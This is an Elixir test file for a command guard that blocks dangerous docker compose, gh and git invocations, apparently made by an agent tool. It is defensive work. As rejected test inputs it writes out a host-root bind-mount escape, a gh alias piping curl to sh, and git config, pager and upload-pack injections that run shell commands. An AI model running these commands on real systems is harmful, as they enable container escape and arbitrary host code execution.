defmodule Loopyard.Tools.CommandGuardTest do
  use ExUnit.Case, async: true

  alias Loopyard.Tools.CommandGuard

  describe "compose/1 — blocks host escape and cross-workspace retargeting" do
    test "rejects `run` with a host bind mount (the CRITICAL escape)" do
      assert {:error, msg} = CommandGuard.compose("run --rm -v /:/host alpine sh -c 'id'")
      assert msg =~ "run"
    end

    test "rejects `exec` (arbitrary command in a live container)" do
      assert {:error, _} = CommandGuard.compose("exec dev sh")
    end

    test "rejects retargeting the compose file via -f/--file after the subcommand" do
      # `-f`/`--file` is a persistent root flag: `up -f /other/compose.yml`
      # would run a DIFFERENT project entirely.
      assert {:error, _} =
               CommandGuard.compose("up -f /Users/x/.loopyard/other/docker-compose.yml")

      assert {:error, _} = CommandGuard.compose("up --file /etc/evil.yml")
    end

    test "rejects retargeting the project via -p/--project-name (cross-workspace)" do
      assert {:error, _} = CommandGuard.compose("down -v -p loopyard-other-ws")
      assert {:error, _} = CommandGuard.compose("up --project-name loopyard-other")
      assert {:error, _} = CommandGuard.compose("up -ploopyard-other")
    end

    test "rejects --project-directory and --env-file" do
      assert {:error, _} = CommandGuard.compose("up --project-directory /Users/x/.loopyard")
      assert {:error, _} = CommandGuard.compose("up --env-file /Users/x/.loopyard/secrets")
    end

    test "rejects a leading global flag before any subcommand" do
      assert {:error, _} = CommandGuard.compose("-f /other up")
      assert {:error, _} = CommandGuard.compose("--project-name loopyard-other ps")
    end

    test "rejects an empty command" do
      assert {:error, _} = CommandGuard.compose("")
      assert {:error, _} = CommandGuard.compose("   ")
    end

    test "ALLOWS the legitimate day-to-day commands" do
      for cmd <- [
            "up -d",
            "up -d --build",
            "up --build",
            "down",
            # `down -v` removes THIS project's own volumes — safe, different
            # meaning of -v than `run -v host:mount`.
            "down -v",
            "ps",
            "logs dev",
            # `logs -f` is follow, not the file flag — must stay allowed.
            "logs -f dev",
            "logs --tail 100 dev",
            "restart dev",
            "stop",
            "start",
            "build --no-cache",
            "pull",
            "config"
          ] do
        assert :ok == CommandGuard.compose(cmd), "expected :ok for #{inspect(cmd)}"
      end
    end
  end

  describe "gh/1 — blocks the shell-RCE families, allows read/query" do
    test "rejects `alias set --shell` (arbitrary host shell)" do
      assert {:error, msg} = CommandGuard.gh(~s(alias set --clobber pwn '!curl x|sh'))
      assert msg =~ "alias"
    end

    test "rejects `extension install` (arbitrary code)" do
      assert {:error, _} = CommandGuard.gh("extension install someone/gh-x")
    end

    test "rejects `config set` (pager/editor can execute)" do
      assert {:error, _} = CommandGuard.gh("config set pager 'sh -c evil'")
    end

    test "rejects empty" do
      assert {:error, _} = CommandGuard.gh("")
    end

    test "ALLOWS read/query commands" do
      for cmd <- [
            "org list",
            "repo list overtonxyz --limit 20",
            "pr list",
            "issue list",
            "api /user",
            "search repos loopyard",
            "auth status"
          ] do
        assert :ok == CommandGuard.gh(cmd), "expected :ok for #{inspect(cmd)}"
      end
    end
  end

  describe "git/1 — blocks host-side config/alias injection" do
    test "rejects -c config injection (alias shell RCE vector)" do
      assert {:error, _} = CommandGuard.git(["-c", "alias.x=!sh -c 'id'", "x"])
      assert {:error, _} = CommandGuard.git(["-c", "core.pager=sh -c evil", "log"])
    end

    test "rejects -C (run in another directory), pack overrides, exec-path" do
      assert {:error, _} = CommandGuard.git(["-C", "/etc", "status"])
      assert {:error, _} = CommandGuard.git(["clone", "--upload-pack", "sh -c x", "u", "d"])
      assert {:error, _} = CommandGuard.git(["--exec-path=/tmp/evil", "status"])
    end

    test "ALLOWS ordinary porcelain" do
      for argv <- [
            ["status"],
            ["diff", "--stat"],
            ["add", "-A"],
            ["commit", "-m", "msg"],
            ["log", "--oneline", "-20"],
            ["push", "origin", "HEAD"],
            ["pull", "--rebase"],
            ["checkout", "-b", "feature"]
          ] do
        assert :ok == CommandGuard.git(argv), "expected :ok for #{inspect(argv)}"
      end
    end
  end
end
